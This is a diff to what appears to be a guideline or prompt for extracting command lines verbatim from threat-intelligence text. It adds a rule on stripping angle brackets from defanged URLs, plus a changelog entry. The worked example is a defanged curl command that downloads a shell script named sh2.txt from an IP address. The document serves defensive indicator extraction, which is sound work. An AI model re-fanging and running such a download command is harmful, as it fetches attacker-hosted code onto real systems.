@@ -184,6 +184,11 @@ observability, not interestingness.
 - Preserve casing, spacing (including irregular spacing), quoting, paths, punctuation (including semicolons).
 - Do NOT expand abbreviations or environment variables.
 - Preserve obfuscated or encoded content exactly (including base64 blobs).
+- Strip enclosing `< >` from a defanged URL inside a command line -- the angle brackets are a
+  source-rendering artifact, not typed input. Preserve `hxxp://`, `[.]`, and every other
+  defanging convention verbatim.
+  Example: `curl -o sh2.txt <hxxp://173.254.204[.]72/sh2.txt>` -> extract
+  `curl -o sh2.txt hxxp://173.254.204[.]72/sh2.txt`.
 
 ### Wrapper handling (strict and limited)
 
@@ -322,4 +327,4 @@ COMPLETE-ARTIFACT RULE — a full literal command inside a rule/query is extract
 fragment is not.
 When in doubt, OMIT.
 
-_Last updated: 2026-07-05 -- added NetworkIndicatorExtract sibling and boundary rule (doc sync with live seed prompt)._
+_Last updated: 2026-07-21 -- FIDELITY: strip enclosing `< >` from defanged URLs inside a command line (rendering artifact, not typed input); defanging itself still preserved verbatim._
